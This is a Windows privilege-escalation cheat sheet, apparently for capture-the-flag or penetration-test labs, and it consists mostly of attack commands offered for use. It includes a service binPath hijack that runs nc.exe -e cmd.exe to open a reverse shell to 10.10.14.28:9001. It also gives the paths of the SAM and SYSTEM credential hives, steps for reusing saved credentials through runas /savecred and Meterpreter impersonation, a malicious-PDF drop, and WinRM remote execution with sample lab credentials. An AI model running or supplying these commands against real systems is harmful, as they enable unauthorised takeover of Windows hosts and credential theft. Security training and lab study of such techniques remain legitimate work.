# windows-privilege-escalation-cheat-sheet
Updating on a daily base.


Made By J3wker


  ██╗          ██╗██████╗ ██╗    ██╗██╗  ██╗███████╗██████╗      ██╗
 ██╔╝          ██║╚════██╗██║    ██║██║ ██╔╝██╔════╝██╔══██╗     ╚██╗ 
██╔╝█████╗     ██║ █████╔╝██║ █╗ ██║█████╔╝ █████╗  ██████╔╝█████╗╚██╗
╚██╗╚════╝██   ██║ ╚═══██╗██║███╗██║██╔═██╗ ██╔══╝  ██╔══██╗╚════╝██╔╝
 ╚██╗     ╚█████╔╝██████╔╝╚███╔███╔╝██║  ██╗███████╗██║  ██║     ██╔╝ 
  ╚═╝      ╚════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     ╚═╝ 



BEFORE STARTING !! if system before 2012 - try juciypotato
use `systeminfo` | google the system and update version - look for CVE's and kernel Exploits.
If nothing found start the check list.


Check List:
_____________________

NOTE: List files you saw when you enumerated the web and looked intersering. 
Example:

`secret.php`
`db.php`
`auth.php`

Read them after getting a basic shell - might have creds in them 
if so `net user` try the creds against users - maybe it matches.

Example:
`runas /user:Administrator cmd.exe`
Check running process 
1. `ps`

```
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
```

remmber PID of weird process
Write it down and use
2. `netstat -ano`
Check for open ports - google that port - what is it ?

see Users
3. `net user`

see specific username information / groups
4. `net user username` - which group is he in ? Logs reader ? read logs - maybe passwords hidden, maybe automatic script the read logs
inject command!, part of "Remote Management Group" ? maybe use WinRM 

5. check Credentials mananger:

`dir C:\Users\username\AppData\Local\Microsoft\Credentials\`
`dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\`
`cmdkey /list` 
if is has keys try:

Domain could be also Hostname or just use username alone
runas /user:DOMAIN\Username /savecred command

if that doesnt work - try Meterpreter `load incognito`- maybe impersonate to a certain user

6. check `Documents` folder 
7. check `Downloads` folder
8. check `Program Files (x86)` folder
9. check `Program Files` folder
10. check `AppData` folder and etc `Local` - `LocalLow` - `Roaming`

Look for werid files and installed programs - look for exploits in them.

______________________________________________________
11. check services with write access - to change binpath

`accesschk.exe -accepteula -uvwc *`

Example:
1. `sc config usosvc binPath="C:\Windows\System32\spool\drivers\color\nc.exe 10.10.14.28 9001 -e cmd.exe"`
$ Start a listener on port 9001
2. `sc stop usosvc`
3. `sc start usosvc`
4. get a shell.
______________________________________________________

12. Check for files like .txt / .php - read them.
check for automated scripts that are waiting for scertain files for example:

"Admin is waiting for PDF drop it in C:\Docs" - create a Malicious PDF - drop it

13. Look for backups files `SAM.bak` - `SYSTEM.bak`/ windows image backup.

```
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

14. What Groups are on the system? 
`net localgroup`

15. Unquoated services ? if so hijack it!

```
wmic service get name,displayname,pathname,startmode 2>nul |findstr /i "Auto" 2>nul |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v """
```

16. What scheduled tasks are there? Anything custom implemented?

`schtasks /query /fo LIST 2>nul | findstr TaskName`

or in powershell:

`Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State`

17. what is running on startup ?

`wmic startup get caption,command`

18. Permissions on specific folders ?

```
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"
```
NOTE: Change the value of "Everyone" to your desire.
example:

```
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
```

19. If you have user Creds and WinRM is open try:

NOTE: Change Values `$user`  and `$pw` to match your case.

```
$user = 'SNIPER\Chris'
$pw = '36mEAhz/B8xQ~2VM'
$secpw = ConvertTo-SecureString $pw -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $user,$secpw
```

Possible to convert into one-liner:

```
$user = 'SNIPER\Chris';$pw = '36mEAhz/B8xQ~2VM';$secpw = ConvertTo-SecureString $pw -AsPlainText -Force;$cred = New-Object System.Management.Automation.PSCredential $user,$secpw
```


and then:

```
Invoke-Command -Computer localhost -Credential $cred -ScriptBlock {command}
```

Get command at the user you prompted 








